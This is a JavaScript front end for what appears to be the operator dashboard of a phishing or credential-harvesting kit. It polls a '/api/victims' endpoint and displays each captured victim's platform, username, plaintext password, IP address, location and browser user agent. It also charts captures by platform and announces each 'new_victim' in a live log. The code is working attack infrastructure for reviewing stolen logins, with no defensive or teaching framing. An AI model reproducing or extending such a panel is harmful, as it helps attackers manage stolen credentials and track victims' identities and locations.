const canvas = document.getElementById('bg-canvas');
const ctx = canvas.getContext('2d');
let particles = [];

function initParticles() {
  canvas.width = window.innerWidth; canvas.height = window.innerHeight;
  particles = [];
  for (let i = 0; i < 80; i++) {
    particles.push({
      x: Math.random() * canvas.width, y: Math.random() * canvas.height,
      vx: (Math.random() - 0.5) * 0.5, vy: (Math.random() - 0.5) * 0.5, size: Math.random() * 2
    });
  }
}

function drawParticles() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  ctx.fillStyle = 'rgba(0, 255, 255, 0.2)'; ctx.strokeStyle = 'rgba(0, 255, 255, 0.05)';
  particles.forEach((p, i) => {
    p.x += p.vx; p.y += p.vy;
    if (p.x < 0 || p.x > canvas.width) p.vx *= -1; if (p.y < 0 || p.y > canvas.height) p.vy *= -1;
    ctx.beginPath(); ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2); ctx.fill();
    for (let j = i + 1; j < particles.length; j++) {
      let p2 = particles[j]; let dist = Math.hypot(p.x - p2.x, p.y - p2.y);
      if (dist < 150) { ctx.lineWidth = 1 - dist / 150; ctx.beginPath(); ctx.moveTo(p.x, p.y); ctx.lineTo(p2.x, p2.y); ctx.stroke(); }
    }
  });
  requestAnimationFrame(drawParticles);
}
initParticles(); drawParticles(); window.addEventListener('resize', initParticles);

function showSection(id) {
  document.getElementById('section-dashboard').style.display = id === 'dashboard' ? 'block' : 'none';
  document.getElementById('section-contact').style.display = id === 'contact' ? 'block' : 'none';
  document.getElementById('section-soc').style.display = id === 'soc' ? 'block' : 'none';
  document.getElementById('section-media').style.display = id === 'media' ? 'block' : 'none';
  document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
  event.currentTarget.classList.add('active');
}

const socket = io();
let platformChart = null;

function addLog(msg, type = '') {
  const feed = document.getElementById('log-feed');
  const socFeed = document.getElementById('soc-log-feed');
  const item = document.createElement('div');
  item.className = `log-item ${type}`;
  item.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
  feed.prepend(item.cloneNode(true));
  if (socFeed) socFeed.prepend(item.cloneNode(true));
  if (feed.childNodes.length > 50) feed.lastChild.remove();
  if (socFeed && socFeed.childNodes.length > 100) socFeed.lastChild.remove();
}

function loadData() {
  fetch('/api/victims').then(r => r.json()).then(data => {
    renderTable(data); updateStats(data); updateChart(data);
  });
}

function updateStats(data) {
  const creds = data.filter(v => v.username !== 'IP_ONLY').length;
  const ips = data.filter(v => v.username === 'IP_ONLY').length;
  const platforms = new Set(data.map(v => v.platform)).size;
  document.getElementById('stat-total').innerText = data.length;
  document.getElementById('stat-creds').innerText = creds;
  document.getElementById('stat-ips').innerText = ips;
  document.getElementById('stat-platforms').innerText = platforms;
  if(document.getElementById('soc-threats')) {
    document.getElementById('soc-threats').innerText = data.length * 3; // Simulated metrics
  }
}

function updateChart(data) {
  const counts = {}; data.forEach(v => counts[v.platform] = (counts[v.platform] || 0) + 1);
  if (platformChart) platformChart.destroy();
  const ctxChart = document.getElementById('platformChart').getContext('2d');
  platformChart = new Chart(ctxChart, {
    type: 'doughnut',
    data: { labels: Object.keys(counts), datasets: [{ data: Object.values(counts), backgroundColor: ['#00ffff', '#9d00ff', '#ff2d86', '#10b981', '#f59e0b', '#ff3232'], borderWidth: 0 }] },
    options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { position: 'right', labels: { color: '#94a3b8' } } }, cutout: '70%' }
  });
}

function renderTable(data) {
  const tbody = document.getElementById('victims-body');
  if (!data.length) { tbody.innerHTML = '<tr><td colspan="8" style="text-align:center; padding: 5rem; color: var(--dim)">AWAITING PAYLOADS...</td></tr>'; return; }
  tbody.innerHTML = data.map((v, i) => `
    <tr>
      <td style="color:var(--dim)">#${v.id}</td>
      <td><span class="badge badge-cyan">${v.platform}</span></td>
      <td style="font-weight:700">${v.username === 'IP_ONLY' ? '<span style="color:var(--dim)">DISCOVERY</span>' : v.username}</td>
      <td style="font-family:'JetBrains Mono'; color:var(--pink)">${v.password === 'N/A' ? '—' : v.password}</td>
      <td style="font-family:'JetBrains Mono'; font-size:0.85rem">${v.ip}</td>
      <td style="font-size:0.8rem; color:var(--cyan)">${v.location || 'Unknown'}</td>
      <td style="font-size:0.75rem; color:var(--dim); max-width: 150px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="${v.ua}">${v.ua || 'Unknown'}</td>
      <td style="color:var(--dim); font-size:0.8rem">${v.timestamp}</td>
    </tr>
  `).join('');
}

socket.on('new_victim', () => { addLog(`New capture detected!`, "success"); loadData(); });
loadData(); setInterval(loadData, 5000);
